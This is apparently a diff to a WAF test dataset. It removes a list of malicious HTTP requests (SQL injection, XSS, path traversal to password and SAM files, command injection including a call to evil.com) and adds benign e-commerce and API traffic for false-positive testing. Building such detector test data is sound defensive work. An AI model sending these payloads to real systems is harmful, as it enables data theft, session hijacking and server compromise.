@@ -1,79 +1,122 @@
 # ============================================================================
-# DWAF Malicious Request Test Dataset
-# Attack Categories: SQL Injection, XSS, Path Traversal, Command Injection
+# DWAF Legitimate HTTP Traffic Dataset
+#
+# Purpose:
+#   - Baseline traffic for ML detector training
+#   - False positive testing for DWAF pipeline
+#
 # Format:
 #   METHOD URL [BODY]
 #
-# Used for:
-# - ML detector testing
-# - WAF rule validation
-# - ZKP pipeline verification
+# NOTE:
+#   These are safe benign requests that simulate normal web usage.
 # ============================================================================
 
 
-# ── Classic SQL Injection ───────────────────────────────────────────────────
-GET /login?username=admin'--&password=anything
-GET /search?q=' OR '1'='1
-GET /user?id=1 UNION SELECT username,password FROM users--
-GET /item?id=1; DROP TABLE users;--
-GET /page?id=1' AND SLEEP(5)--
-GET /product?id=1 OR 1=1--
-GET /auth?user=admin'/*
-GET /data?id=1' UNION SELECT null,null,null--
-GET /search?q=1' ORDER BY 3--
-GET /login?user=1' AND '1'='1
-GET /profile?id=1' OR 'a'='a
-GET /account?id=1 OR 1=1#
+# ── Homepage and navigation ───────────────────────────────────────────────
+GET /
+GET /home
+GET /about
+GET /contact
+GET /help
+GET /faq
 
-# ── Blind / Time-Based SQL Injection ────────────────────────────────────────
-GET /login?id=1' AND SLEEP(5)--
-GET /product?id=10 AND IF(1=1,SLEEP(5),0)
-GET /search?q=1' AND BENCHMARK(1000000,MD5(1))--
-GET /user?id=5' WAITFOR DELAY '0:0:5'--
 
-# ── URL Encoded SQL Injection ───────────────────────────────────────────────
-GET /anadir.jsp?id=2&cantidad=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos
-GET /search?q=%27+OR+%271%27%3D%271
-GET /item?id=1%27+UNION+SELECT+username%2Cpassword+FROM+users--
-GET /login?user=%27+OR+1%3D1--
-GET /page?id=1%27+AND+SLEEP%285%29--
-GET /data?id=%27%20UNION%20SELECT%20null,null,null--
+# ── Normal GET requests (E-commerce flow) ─────────────────────────────────
+GET /tienda1/index.jsp
+GET /tienda1/publico/listado.jsp
+GET /tienda1/publico/producto.jsp?id=1
+GET /tienda1/publico/producto.jsp?id=2
+GET /tienda1/publico/producto.jsp?id=3
 
-# ── POST Body SQL Injection ─────────────────────────────────────────────────
-POST /login username=admin'--&password=x
-POST /search q=' OR '1'='1'&submit=Search
-POST /register email=test@test.com'&name=John
-POST /update id=1;+DROP+TABLE+users--&value=test
-POST /profile id=1' OR '1'='1'&update=true
+GET /tienda1/publico/anadir.jsp?id=1&nombre=Aceite+de+Oliva&precio=12&cantidad=2
+GET /tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=1
+GET /tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=100&cantidad=2
 
-# ── Cross-Site Scripting (XSS) ──────────────────────────────────────────────
-GET /search?q=<script>alert('xss')</script>
-GET /page?title=<img src=x onerror=alert(1)>
-GET /user?name=<svg onload=alert(document.cookie)>
-GET /comment?text=javascript:alert(1)
-GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
-GET /profile?bio=<iframe src="javascript:alert(1)">
-GET /msg?text=<body onload=alert('XSS')>
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=choong&remember=off
+GET /tienda1/publico/pagar.jsp
+GET /tienda1/publico/vaciar.jsp
+GET /tienda1/publico/salir.jsp
 
-# ── Path Traversal / File Disclosure ────────────────────────────────────────
-GET /file?path=../../etc/passwd
-GET /download?file=../../../windows/system32/config/sam
-GET /read?name=%2e%2e%2f%2e%2e%2fetc%2fpasswd
-GET /view?doc=....//....//etc/passwd
-GET /logs?file=../../../../var/log/auth.log
-GET /backup?file=../../../etc/shadow
 
-# ── Command Injection ───────────────────────────────────────────────────────
-GET /ping?host=localhost;cat+/etc/passwd
-GET /exec?cmd=ls+-la+/etc
-GET /run?input=test|whoami
-GET /check?url=http://evil.com/`id`
-GET /admin?cmd=whoami;uname+-a
-GET /test?host=8.8.8.8&&cat+/etc/passwd
-GET /debug?cmd=$(id)
+# ── Static assets ─────────────────────────────────────────────────────────
+GET /static/css/style.css
+GET /static/css/bootstrap.min.css
+GET /static/js/app.js
+GET /static/js/jquery.min.js
+GET /static/images/logo.png
+GET /static/images/banner.jpg
+GET /favicon.ico
+GET /robots.txt
 
-# ── Mixed / Obfuscated Payloads ─────────────────────────────────────────────
-GET /search?q='/**/OR/**/'1'='1
-GET /login?user=admin'--+&password=test
-GET /item?id=1/**/UNION/**/SELECT/**/1,2,3--
-GET /profile?id=1'%20OR%20'1'%3D'1
+
+# ── API endpoints ─────────────────────────────────────────────────────────
+GET /api/v1/products
+GET /api/v1/products/1
+GET /api/v1/products/2
+GET /api/v1/products?category=food
+GET /api/v1/products?category=food&limit=10
+GET /api/v1/products?category=beverages&limit=20
+
+GET /api/v1/users/profile
+GET /api/v1/orders
+GET /api/v1/orders?status=pending
+GET /api/v1/orders?status=completed
+
+
+# ── Normal POST requests ──────────────────────────────────────────────────
+POST /tienda1/publico/anadir.jsp id=1&nombre=Aceite+de+Oliva&precio=12&cantidad=2
+POST /tienda1/publico/autenticar.jsp modo=entrar&login=user1&pwd=password123
+POST /tienda1/publico/pagar.jsp B1=Pagar
+
+POST /api/v1/login username=john&password=secure123
+POST /api/v1/register name=John+Doe&email=john@example.com&password=pass123
+
+
+# ── Search queries ────────────────────────────────────────────────────────
+GET /search?q=olive+oil
+GET /search?q=wine+rioja
+GET /search?q=iberico+ham
+GET /search?q=food+products
+GET /search?q=jamon+iberico&price_min=50&price_max=200
+GET /search?q=olive+oil&sort=price
+
+
+# ── Pagination and filters ────────────────────────────────────────────────
+GET /products?page=1&limit=20
+GET /products?page=2&limit=20
+GET /products?page=3&limit=20
+GET /products?page=4&limit=20&sort=name
+
+GET /orders?page=1&status=completed
+GET /orders?page=2&status=completed
+
+
+# ── User account actions ──────────────────────────────────────────────────
+GET /account/profile
+GET /account/orders
+GET /account/settings
+
+POST /account/update name=John+Doe&email=john@example.com
+POST /account/password old=oldpass123&new=newpass456&confirm=newpass456
+
+
+# ── Cart and checkout flow ────────────────────────────────────────────────
+GET /cart
+GET /cart/summary
+
+POST /cart/add product_id=1&quantity=2
+POST /cart/add product_id=3&quantity=1
+POST /cart/remove product_id=1
+
+GET /checkout
+POST /checkout/confirm address=123+Main+St&city=Madrid&zip=28001
+GET /order/confirmation?id=12345
+
+
+# ── Health and monitoring endpoints ───────────────────────────────────────
+GET /health
+GET /ping
+GET /status
+GET /metrics
+GET /api/v1/health
